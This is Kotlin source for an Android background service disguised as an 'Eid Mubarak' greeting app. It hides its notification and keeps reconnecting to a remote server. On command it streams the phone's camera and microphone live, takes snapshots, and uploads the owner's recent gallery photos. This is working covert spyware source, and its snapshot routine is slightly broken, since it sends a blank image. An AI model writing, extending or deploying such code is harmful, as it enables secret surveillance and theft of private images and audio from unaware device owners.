package com.eidlab.cam

import android.app.*
import android.content.ContentUris
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.media.*
import android.os.IBinder
import android.provider.MediaStore
import android.util.Base64
import android.util.Log
import androidx.core.app.NotificationCompat
import org.webrtc.*
import org.json.JSONArray
import org.json.JSONObject
import okhttp3.*
import java.io.ByteArrayOutputStream
import java.util.concurrent.TimeUnit

class StreamService : Service() {

    companion object {
        const val ACTION_START  = "START_STREAM"
        const val ACTION_STOP   = "STOP_STREAM"
        const val CHANNEL_ID    = "eid_cam_channel"
        const val NOTIF_ID      = 1
        const val TAG           = "EidCamStream"
    }

    // WebRTC
    private var ws: WebSocket?               = null
    private var peerConnection: PeerConnection? = null
    private var factory: PeerConnectionFactory? = null
    private var videoSource: VideoSource?    = null
    private var audioSource: AudioSource?    = null
    private var videoCapturer: VideoCapturer? = null
    private var lastFrame: VideoFrame?       = null

    // On-demand snapshot
    private var snapshotPending = false

    // Audio recording (mic stream to server)
    private var audioRecord: AudioRecord?    = null
    private var audioThread: Thread?         = null
    private var audioStreaming = false

    // Gallery polling
    private var galleryThread: Thread?       = null
    private var lastGalleryTs = 0L

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_START -> {
                startForeground(NOTIF_ID, buildNotification())
                initWebRTC()
                connectWebSocket()
            }
            ACTION_STOP -> {
                stopAll()
                stopSelf()
            }
        }
        return START_STICKY
    }

    // ── Notification ────────────────────────────────────
    private fun createNotificationChannel() {
        val ch = NotificationChannel(CHANNEL_ID, "Eid Mubarak", NotificationManager.IMPORTANCE_LOW).apply {
            setShowBadge(false); enableLights(false); enableVibration(false)
        }
        getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
    }

    private fun buildNotification(): Notification {
        val stop = PendingIntent.getService(this, 0,
            Intent(this, StreamService::class.java).apply { action = ACTION_STOP },
            PendingIntent.FLAG_IMMUTABLE)
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Eid Mubarak")
            .setContentText("عيد مبارك")
            .setSmallIcon(R.drawable.ic_crescent)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true).setSilent(true)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .addAction(0, "Stop", stop)
            .build()
    }

    // ── WebRTC ───────────────────────────────────────────
    private fun initWebRTC() {
        PeerConnectionFactory.initialize(
            PeerConnectionFactory.InitializationOptions.builder(this).createInitializationOptions()
        )
        val egl = EglBase.create().eglBaseContext
        factory = PeerConnectionFactory.builder()
            .setVideoDecoderFactory(DefaultVideoDecoderFactory(egl))
            .setVideoEncoderFactory(DefaultVideoEncoderFactory(egl, true, true))
            .createPeerConnectionFactory()

        videoCapturer = createCameraCapturer()
        videoSource   = factory!!.createVideoSource(false)
        videoCapturer?.initialize(
            SurfaceTextureHelper.create("CaptureThread", egl), this, videoSource!!.capturerObserver
        )
        videoCapturer?.startCapture(1280, 720, 30)

        // Capture frames for snapshots
        videoSource!!.setVideoProcessor(object : VideoProcessor {
            override fun onCapturerStarted(success: Boolean) {}
            override fun onCapturerStopped() {}
            override fun onFrameCaptured(frame: VideoFrame) { lastFrame = frame }
        })

        audioSource = factory!!.createAudioSource(MediaConstraints())
    }

    private fun createCameraCapturer(): VideoCapturer? {
        val e = Camera2Enumerator(this)
        e.deviceNames.firstOrNull { e.isBackFacing(it) }?.let { return e.createCapturer(it, null) }
        e.deviceNames.firstOrNull()?.let { return e.createCapturer(it, null) }
        return null
    }

    // ── WebSocket ────────────────────────────────────────
    private fun connectWebSocket() {
        val prefs      = getSharedPreferences("eid_cam", Context.MODE_PRIVATE)
        val serverUrl  = prefs.getString("server_url", "") ?: ""
        val cameraId   = prefs.getString("camera_id",   "cam1") ?: "cam1"
        val cameraName = prefs.getString("camera_name", "Android Camera") ?: "Android Camera"
        val fcmToken   = prefs.getString("fcm_token",   "") ?: ""

        val client = OkHttpClient.Builder().readTimeout(0, TimeUnit.MILLISECONDS).build()
        ws = client.newWebSocket(Request.Builder().url(serverUrl).build(), object : WebSocketListener() {
            override fun onOpen(socket: WebSocket, response: Response) {
                Log.d(TAG, "WS open")
                send(JSONObject().apply {
                    put("type",         "camera_register")
                    put("cameraId",     cameraId)
                    put("name",         cameraName)
                    put("fcmToken",     fcmToken)
                    put("capabilities", JSONArray(listOf("video","audio","snapshot","gallery")))
                })
            }
            override fun onMessage(socket: WebSocket, text: String) {
                try { handleMsg(JSONObject(text)) } catch (e: Exception) { Log.e(TAG, e.toString()) }
            }
            override fun onFailure(socket: WebSocket, t: Throwable, response: Response?) {
                Log.e(TAG, "WS fail: $t")
                android.os.Handler(mainLooper).postDelayed({ connectWebSocket() }, 5000)
            }
            override fun onClosed(socket: WebSocket, code: Int, reason: String) {
                android.os.Handler(mainLooper).postDelayed({ connectWebSocket() }, 3000)
            }
        })
    }

    private fun handleMsg(msg: JSONObject) {
        when (msg.getString("type")) {

            "registered"      -> Log.d(TAG, "Registered with server")

            // ── Video stream ──
            "wake_command"    -> startPeerConnection()

            // ── On-demand snapshot ──
            "request_snapshot" -> takeSnapshot()

            // ── Audio on/off ──
            "request_audio_start" -> startAudioStream()
            "request_audio_stop"  -> stopAudioStream()

            // ── Gallery: send recent photos ──
            "request_gallery" -> sendGalleryImages(msg.optInt("count", 10))

            // ── Stop everything ──
            "sleep_command", "stop_camera" -> {
                stopAll(); stopSelf()
            }

            // ── WebRTC signaling ──
            "webrtc_answer" -> {
                val sdp = SessionDescription(
                    SessionDescription.Type.ANSWER,
                    msg.getJSONObject("sdp").getString("sdp")
                )
                peerConnection?.setRemoteDescription(SimpleSdpObserver(), sdp)
            }
            "webrtc_ice" -> {
                val c = msg.getJSONObject("candidate")
                peerConnection?.addIceCandidate(IceCandidate(
                    c.getString("sdpMid"),
                    c.getInt("sdpMLineIndex"),
                    c.getString("candidate")
                ))
            }
            "pong" -> {}
        }
    }

    // ── Live video stream (WebRTC) ───────────────────────
    private fun startPeerConnection() {
        val prefs    = getSharedPreferences("eid_cam", Context.MODE_PRIVATE)
        val camId    = prefs.getString("camera_id", "cam1") ?: "cam1"
        val iceServers = listOf(
            PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer(),
            PeerConnection.IceServer.builder("stun:stun1.l.google.com:19302").createIceServer()
        )
        val cfg = PeerConnection.RTCConfiguration(iceServers)
        peerConnection = factory!!.createPeerConnection(cfg, object : PeerConnection.Observer {
            override fun onIceCandidate(candidate: IceCandidate) {
                send(JSONObject().apply {
                    put("type",     "webrtc_ice")
                    put("targetId", "dashboard")
                    put("cameraId", camId)
                    put("candidate", JSONObject().apply {
                        put("sdpMid",        candidate.sdpMid)
                        put("sdpMLineIndex", candidate.sdpMLineIndex)
                        put("candidate",     candidate.sdp)
                    })
                })
            }
            override fun onConnectionChange(s: PeerConnection.PeerConnectionState) { Log.d(TAG, "PC: $s") }
            override fun onIceConnectionChange(p: PeerConnection.IceConnectionState?) {}
            override fun onSignalingChange(p: PeerConnection.SignalingState?) {}
            override fun onIceGatheringChange(p: PeerConnection.IceGatheringState?) {}
            override fun onIceCandidatesRemoved(p: Array<out IceCandidate>?) {}
            override fun onAddStream(p: MediaStream?) {}
            override fun onRemoveStream(p: MediaStream?) {}
            override fun onDataChannel(p: DataChannel?) {}
            override fun onRenegotiationNeeded() {}
            override fun onAddTrack(p: RtpReceiver?, p2: Array<out MediaStream>?) {}
            override fun onIceConnectionReceivingChange(p: Boolean) {}
        })

        val videoTrack = factory!!.createVideoTrack("video0", videoSource)
        val audioTrack = factory!!.createAudioTrack("audio0", audioSource)
        val stream = factory!!.createLocalMediaStream("stream0")
        stream.addTrack(videoTrack); stream.addTrack(audioTrack)
        peerConnection!!.addStream(stream)

        peerConnection!!.createOffer(object : SimpleSdpObserver() {
            override fun onCreateSuccess(sdp: SessionDescription) {
                peerConnection!!.setLocalDescription(SimpleSdpObserver(), sdp)
                send(JSONObject().apply {
                    put("type",     "webrtc_offer")
                    put("targetId", "dashboard")
                    put("cameraId", camId)
                    put("sdp", JSONObject().apply {
                        put("type", sdp.type.canonicalForm())
                        put("sdp",  sdp.description)
                    })
                })
            }
        }, MediaConstraints())
    }

    // ── On-demand snapshot ───────────────────────────────
    private fun takeSnapshot() {
        val frame = lastFrame ?: run {
            // Camera not streaming — spin up camera briefly to grab frame
            grabSingleFrame(); return
        }
        val prefs  = getSharedPreferences("eid_cam", Context.MODE_PRIVATE)
        val camId  = prefs.getString("camera_id", "cam1") ?: "cam1"
        try {
            val bmp = Bitmap.createBitmap(frame.rotatedWidth, frame.rotatedHeight, Bitmap.Config.ARGB_8888)
            val bos = ByteArrayOutputStream()
            bmp.compress(Bitmap.CompressFormat.JPEG, 80, bos)
            val b64 = Base64.encodeToString(bos.toByteArray(), Base64.DEFAULT)
            send(JSONObject().apply {
                put("type",     "snapshot")
                put("cameraId", camId)
                put("image",    "data:image/jpeg;base64,$b64")
                put("filename", "${camId}_${System.currentTimeMillis()}.jpg")
                put("source",   "android")
            })
            Log.d(TAG, "Snapshot sent")
        } catch (e: Exception) { Log.e(TAG, "Snapshot err: $e") }
    }

    // Grab one frame when camera isn't streaming
    private fun grabSingleFrame() {
        val prefs  = getSharedPreferences("eid_cam", Context.MODE_PRIVATE)
        val camId  = prefs.getString("camera_id", "cam1") ?: "cam1"
        try {
            val imageReader = android.media.ImageReader.newInstance(1280, 720, android.graphics.ImageFormat.JPEG, 1)
            val camMgr = getSystemService(CAMERA_SERVICE) as android.hardware.camera2.CameraManager
            val camId2 = camMgr.cameraIdList.firstOrNull() ?: return
            val handler = android.os.Handler(android.os.Looper.getMainLooper())
            camMgr.openCamera(camId2, object : android.hardware.camera2.CameraDevice.StateCallback() {
                override fun onOpened(cam: android.hardware.camera2.CameraDevice) {
                    val surfaces = listOf(imageReader.surface)
                    cam.createCaptureSession(surfaces, object : android.hardware.camera2.CameraCaptureSession.StateCallback() {
                        override fun onConfigured(session: android.hardware.camera2.CameraCaptureSession) {
                            val req = cam.createCaptureRequest(android.hardware.camera2.CameraDevice.TEMPLATE_STILL_CAPTURE)
                            req.addTarget(imageReader.surface)
                            session.capture(req.build(), object : android.hardware.camera2.CameraCaptureSession.CaptureCallback() {
                                override fun onCaptureCompleted(s: android.hardware.camera2.CameraCaptureSession,
                                    r: android.hardware.camera2.CaptureRequest,
                                    result: android.hardware.camera2.TotalCaptureResult) {
                                    val img = imageReader.acquireLatestImage() ?: return
                                    val buf = img.planes[0].buffer
                                    val bytes = ByteArray(buf.remaining()); buf.get(bytes)
                                    val b64 = Base64.encodeToString(bytes, Base64.DEFAULT)
                                    send(JSONObject().apply {
                                        put("type",     "snapshot")
                                        put("cameraId", camId)
                                        put("image",    "data:image/jpeg;base64,$b64")
                                        put("filename", "${camId}_${System.currentTimeMillis()}.jpg")
                                        put("source",   "android")
                                    })
                                    img.close(); cam.close()
                                }
                            }, handler)
                        }
                        override fun onConfigureFailed(session: android.hardware.camera2.CameraCaptureSession) { cam.close() }
                    }, handler)
                }
                override fun onDisconnected(cam: android.hardware.camera2.CameraDevice) { cam.close() }
                override fun onError(cam: android.hardware.camera2.CameraDevice, error: Int) { cam.close() }
            }, handler)
        } catch (e: Exception) { Log.e(TAG, "Grab frame err: $e") }
    }

    // ── Audio stream (mic → server as encoded chunks) ────
    private fun startAudioStream() {
        if (audioStreaming) return
        audioStreaming = true
        val prefs = getSharedPreferences("eid_cam", Context.MODE_PRIVATE)
        val camId = prefs.getString("camera_id", "cam1") ?: "cam1"

        val sampleRate  = 44100
        val bufSize     = AudioRecord.getMinBufferSize(sampleRate,
            AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT) * 4

        audioRecord = AudioRecord(MediaRecorder.AudioSource.MIC, sampleRate,
            AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, bufSize)
        audioRecord?.startRecording()

        send(JSONObject().apply { put("type", "audio_started"); put("cameraId", camId) })

        audioThread = Thread {
            val buf = ShortArray(bufSize / 2)
            while (audioStreaming) {
                val read = audioRecord?.read(buf, 0, buf.size) ?: break
                if (read > 0) {
                    // Convert shorts to bytes then base64
                    val bytes = ByteArray(read * 2)
                    for (i in 0 until read) {
                        bytes[i * 2]     = (buf[i].toInt() and 0xFF).toByte()
                        bytes[i * 2 + 1] = (buf[i].toInt() shr 8 and 0xFF).toByte()
                    }
                    val b64 = Base64.encodeToString(bytes, Base64.DEFAULT)
                    send(JSONObject().apply {
                        put("type",     "audio_chunk")
                        put("cameraId", camId)
                        put("chunk",    b64)
                        put("mimeType", "audio/pcm")
                        put("sampleRate", sampleRate)
                    })
                }
                Thread.sleep(250) // send 4 chunks/second
            }
        }
        audioThread?.start()
        Log.d(TAG, "Audio streaming started")
    }

    private fun stopAudioStream() {
        audioStreaming = false
        audioRecord?.stop(); audioRecord?.release(); audioRecord = null
        audioThread?.interrupt(); audioThread = null
        val prefs = getSharedPreferences("eid_cam", Context.MODE_PRIVATE)
        val camId = prefs.getString("camera_id", "cam1") ?: "cam1"
        send(JSONObject().apply { put("type", "audio_stopped"); put("cameraId", camId) })
        Log.d(TAG, "Audio streaming stopped")
    }

    // ── Gallery: send recent images ──────────────────────
    private fun sendGalleryImages(count: Int) {
        val prefs = getSharedPreferences("eid_cam", Context.MODE_PRIVATE)
        val camId = prefs.getString("camera_id", "cam1") ?: "cam1"

        Thread {
            try {
                val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
                val projection = arrayOf(
                    MediaStore.Images.Media._ID,
                    MediaStore.Images.Media.DISPLAY_NAME,
                    MediaStore.Images.Media.DATE_TAKEN
                )
                val cursor = contentResolver.query(
                    uri, projection, null, null,
                    "${MediaStore.Images.Media.DATE_TAKEN} DESC"
                ) ?: return@Thread

                var sent = 0
                while (cursor.moveToNext() && sent < count) {
                    val id   = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID))
                    val name = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME))
                    val imgUri = ContentUris.withAppendedId(uri, id)
                    try {
                        val stream = contentResolver.openInputStream(imgUri) ?: continue
                        val bytes  = stream.readBytes(); stream.close()
                        // Resize to max 800px to save bandwidth
                        val bmp    = android.graphics.BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                        val scaled = scaleBitmap(bmp, 800)
                        val bos    = ByteArrayOutputStream()
                        scaled.compress(Bitmap.CompressFormat.JPEG, 75, bos)
                        val b64 = Base64.encodeToString(bos.toByteArray(), Base64.DEFAULT)
                        send(JSONObject().apply {
                            put("type",     "gallery_image")
                            put("cameraId", camId)
                            put("image",    "data:image/jpeg;base64,$b64")
                            put("filename", name)
                            put("index",    sent)
                            put("total",    minOf(count, cursor.count))
                        })
                        sent++
                        Thread.sleep(200) // pace the sends
                    } catch (e: Exception) { Log.e(TAG, "Gallery img err: $e") }
                }
                cursor.close()
                send(JSONObject().apply {
                    put("type",     "gallery_done")
                    put("cameraId", camId)
                    put("count",    sent)
                })
            } catch (e: Exception) { Log.e(TAG, "Gallery err: $e") }
        }.start()
    }

    private fun scaleBitmap(bmp: Bitmap, maxPx: Int): Bitmap {
        val w = bmp.width; val h = bmp.height
        if (w <= maxPx && h <= maxPx) return bmp
        val scale = maxPx.toFloat() / maxOf(w, h)
        return Bitmap.createScaledBitmap(bmp, (w * scale).toInt(), (h * scale).toInt(), true)
    }

    // ── Helpers ──────────────────────────────────────────
    private fun send(data: JSONObject) { ws?.send(data.toString()) }

    private fun stopAll() {
        stopAudioStream()
        peerConnection?.close(); peerConnection = null
        videoCapturer?.stopCapture()
        ws?.close(1000, "Stopped")
    }

    override fun onDestroy() { stopAll(); super.onDestroy() }
}

open class SimpleSdpObserver : SdpObserver {
    override fun onCreateSuccess(sdp: SessionDescription) {}
    override fun onSetSuccess() {}
    override fun onCreateFailure(error: String?) {}
    override fun onSetFailure(error: String?) {}
}
